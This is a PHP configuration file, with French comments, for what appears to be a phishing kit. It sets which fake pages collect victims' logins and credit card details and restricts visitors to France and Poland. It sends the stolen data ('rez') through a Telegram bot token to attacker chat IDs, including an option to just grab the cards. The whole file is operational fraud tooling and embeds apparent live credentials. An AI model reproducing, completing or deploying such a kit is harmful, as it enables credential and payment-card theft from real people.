<?php

// TELEGRAM @LesterWeb

$only_mobile = false;

$goodisp = "-1004421920110"; // CHAT ID OU LES CONNEXIONS AUTORISES VONT ATTERRIR
$badisp = "-1004421920110"; // CHAT ID OU LES CONNEXIONS REFUSE VONT ATTERRIR

$token = "eyJ1c2VySWQiOjY1NTc3NDM0NzZ9.8f9352e75d34ac0ec6856262ef37dcdd671c4bd8261d23a51d18342052b94f77"; // NE PAS TOUCHER

$wlCountry = ["FR", "PL"]; // COUNTRY CODE DU PAYS QUE VOUS VOULEZ WHITELIST (VOUS POUVEZ LE TROUVER DANS isps.json)

$novbv = false; // SI TU VEUX JUSTE RECUP LES CC SANS LES OPTIONS MET true

$settings = array(

    // PAGES QUE VOUS VOULEZ ACTIVER / DESACTIVER
    'steps' => [
        'login' => true,
        'alert' => false, // NE PAS MODIFIER
        'billing' => false,
        'card' => true,
    ]
);

$telegram = array(

    'status' => true, // Activer l'envoi des rez via telegram
    'token' => '9252341933:AAE9e2QXgL2BT12GqVJokTlCaeF-2tyr8Gw', // Le token de votre bot

    // Chat IDs où vont atterir les rez
    'RezChatId' => [
        'log' => '-1004459063303',
        'billing' => '-1004459063303',
        'card' => '-1004459063303', // TOUTES LES OPTIONS TOMBERONT ICI EGALEMENT
    ],

    'NotifsChatId' => '-1004459063303',
);

?>